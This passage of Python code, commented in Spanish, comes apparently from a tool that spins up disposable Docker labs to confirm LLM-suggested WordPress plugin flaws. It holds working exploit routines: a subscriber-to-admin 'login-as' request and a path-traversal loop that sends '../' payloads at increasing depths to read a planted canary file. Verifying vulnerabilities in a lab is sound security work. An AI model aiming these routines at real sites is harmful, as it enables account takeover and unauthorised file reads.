    real (confirmado probando contra el plugin de verdad).
    Limitacion conocida: si el endpoint real exige un nonce de WordPress (`_wpnonce`) que no esta
    entre `parameters`, la peticion fallara con ese nonce invalido -- hay que raspar el nonce del
    HTML de la pagina que lo genera y pasarlo en `parameters` (trabajo futuro: hacerlo aqui
    automaticamente). Siempre desmonta el laboratorio al terminar."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    id_param = id_param_hint or _pick_param(parameters, _ID_HINTS)
    if not id_param:
        res.detail = "no se identifico el parametro que lleva el ID del usuario objetivo"
        res.limitations.append("la verificacion de login-as necesita saber que parametro lleva "
                               "el ID del usuario a suplantar; afina 'parameters' en la hipotesis "
                               "del LLM o pasalo a mano (id_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        # confirma que, ANTES del ataque, la sesion del subscriber NO puede ver la pagina
        # solo-admin -- sin esto, un confirm_path mal elegido (accesible por cualquiera) daria un
        # falso VERIFICADO.
        pre_resp = boot.sub_sess.get(boot.base_url + confirm_path, timeout=15,
                                     allow_redirects=True)
        pre_denied = (pre_resp.status_code != 200 or "wp-login.php" in pre_resp.url
                     or "do not have sufficient permissions" in pre_resp.text.lower()
                     or "sorry, you are not allowed" in pre_resp.text.lower())
        if not pre_denied:
            res.detail = (f"{confirm_path} ya era visible para el subscriber ANTES del ataque -- "
                          f"no sirve como confirmacion (prueba otra pagina solo-admin)")
            res.limitations.append("confirm_path debe ser una pagina que un subscriber normal NO "
                                   "pueda ver; con el valor dado no distingue nada")
            return res

        # TODAS las cookies, no solo wordpress_logged_in_*: distintos plugins suplantan por vias
        # distintas (ver docstring) -- esto es evidencia de apoyo, no el criterio de VERIFICADO.
        cookie_before = {c.name: c.value for c in boot.sub_sess.cookies}
        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
        payload[id_param] = boot.admin_id
        m = (http_method or "GET").upper()
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "admin_user": boot.admin_user, "admin_id": boot.admin_id, "id_param": id_param,
            "metodo": m, "endpoint": endpoint, "payload_enviado": dict(payload),
        })
        step(f"enviando la peticion {m} {endpoint} (login-as) dirigida al admin "
             f"(id={boot.admin_id})...")
        try:
            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                               data=payload if m != "GET" else None,
                               params=payload if m == "GET" else None, timeout=20)
            res.logs.append(f"peticion enviada: {resp.status_code}")
            res.evidence["status_code_respuesta"] = resp.status_code
            res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:300]
        except Exception as e:
            res.detail = f"fallo enviando la peticion: {e}"
            return res

        cookie_after = {c.name: c.value for c in boot.sub_sess.cookies}
        cookie_changed = cookie_before != cookie_after
        res.evidence["cookie_sesion_cambio"] = cookie_changed
        step("confirmando: la MISMA sesion del atacante, sin volver a loguearse, intenta ver "
             f"{confirm_path} (solo-admin)...")
        post_resp = boot.sub_sess.get(boot.base_url + confirm_path, timeout=15, allow_redirects=True)
        post_ok = (post_resp.status_code == 200 and "wp-login.php" not in post_resp.url
                  and "do not have sufficient permissions" not in post_resp.text.lower()
                  and "sorry, you are not allowed" not in post_resp.text.lower())
        res.evidence["confirm_path"] = confirm_path
        res.evidence["confirm_status_code"] = post_resp.status_code
        if post_ok:
            res.verified = True
            res.ok = True
            res.detail = (f"LOGIN-AS confirmado: la sesion de '{boot.sub_user}' (subscriber), que "
                          f"segundos antes NO podia ver '{confirm_path}', paso a tener acceso real "
                          f"tras la peticion -- SIN volver a loguearse (admin_id={boot.admin_id})")
            res.evidence["confirmacion"] = (f"la misma requests.Session, sin re-login, paso de "
                                            f"'denegado' a '200 OK' en {confirm_path}"
                                            + (" (y alguna cookie de la sesion cambio tras la "
                                               "peticion, evidencia de apoyo)" if cookie_changed
                                               else " (sin cambio de cookie detectable -- este "
                                               "plugin suplanta por otra via, p.ej. sesion nativa "
                                               "de PHP en vez de la cookie de auth de WordPress)"))
            step("VERIFICADO: la sesion del atacante ahora tiene acceso de administrador.")
            step("capturando pantalla: la MISMA sesion, ahora con acceso de administrador "
                 "(prueba final)...")
            boot.capture(boot.sub_sess, confirm_path,
                   f"Paso 5: LOGIN-AS confirmado -- la sesion de '{boot.sub_user}' (que antes del "
                   f"ataque no podia ver esta pagina) ahora accede a '{confirm_path}' sin haberse "
                   f"vuelto a loguear.",
                   f"Step 5: LOGIN-AS confirmed -- '{boot.sub_user}'s session (which could not see "
                   f"this page before the attack) now accesses '{confirm_path}' without logging "
                   f"in again.")
        else:
            res.ok = True
            res.detail = (f"la peticion se envio (status {resp.status_code}) pero {confirm_path} "
                          f"sigue denegado despues -- el login-as no se confirmo. Si el endpoint "
                          f"real exige un _wpnonce, incluyelo en 'parameters' (ver limitacion en "
                          f"el docstring de esta funcion)")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_path_traversal(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, path_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Verifica path-traversal/LFI: planta un fichero CANARIO con un secreto aleatorio en una ruta
    del sistema de ficheros REAL del contenedor Apache (fuera del volumen /var/www/html, via
    `docker exec` directo -- ver _Lab.write_canary), y confirma que, al pedir esa ruta a traves del
    parametro de fichero/ruta que la hipotesis cita, la respuesta del endpoint devuelve el secreto
    EXACTO. Esto es prueba inequivoca (un secreto de 32 caracteres aleatorios no puede aparecer por
    casualidad), no una deduccion por status code o por el tamano de la respuesta.

    Se prueban varias profundidades de '../' por delante de la ruta absoluta del canario (sin
    saber de antemano cuantos niveles hay entre el directorio base del plugin y la raiz web), ya
    que no se puede leer el codigo para saberlo con certeza en todos los casos; cada intento es una
    peticion real, independiente, registrada en la evidencia. Siempre desmonta el laboratorio."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
    if not path_param:
        res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
        res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
                               "lleva la ruta/nombre de fichero; afina 'parameters' en la "
                               "hipotesis del LLM o pasalo a mano (path_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
             f"propio contenedor, fuera del volumen web)...")
        if not boot.lab.write_canary(canary_path, secret):
            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
            return res
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "path_param": path_param, "canary_path": canary_path, "canary_secret": secret,
            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
        })

        m = (http_method or "GET").upper()
        # varias profundidades de '../': el payload real depende de donde concatena el codigo el
        # parametro, que no podemos saber con certeza sin leer el codigo -- cada intento es una
        # peticion real, no una suposicion que se cuela como si fuera un hecho confirmado.
        attempts = [canary_path.lstrip("/")] + [
            ("../" * n) + canary_path.lstrip("/") for n in (2, 4, 6, 8, 10, 12)
        ] + [canary_path]
        found = False
        tried = []
        for payload_value in attempts:
            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
            payload[path_param] = payload_value
            step(f"probando {m} {endpoint} con {path_param}={payload_value!r}...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            tried.append({"payload": payload_value, "status": resp.status_code,
                          "secret_presente": secret in (resp.text or "")})
            if secret in (resp.text or ""):
                found = True
                res.evidence["payload_ganador"] = payload_value
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
                     f"{path_param}={payload_value!r}.")
                step("capturando pantalla: la respuesta HTTP con el secreto filtrado (prueba "
                     "final)...")
                shot_url = (boot.base_url + endpoint
                           + ("&" if "?" in endpoint else "?")
                           + f"{path_param}={payload_value}") if m == "GET" else None
                if shot_url:
                    boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
                           f"Paso 5: LECTURA DE FICHERO confirmada -- la respuesta real del "
                           f"servidor contiene el secreto plantado en {canary_path}, fuera del "
                           f"directorio web previsto.",
                           f"Step 5: FILE READ confirmed -- the server's real response contains "
                           f"the secret planted at {canary_path}, outside the intended web "
                           f"directory.")
                break
        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
                          f"{res.evidence['payload_ganador']!r} devolvio el secreto exacto "
                          f"plantado en {canary_path} (fuera del directorio web)")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de ruta para {path_param} y "
                          f"ninguna devolvio el secreto plantado -- el traversal no se confirmo "
                          f"(puede necesitar otra profundidad de '../', otra codificacion, o el "
                          f"endpoint/parametro no son los reales)")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()
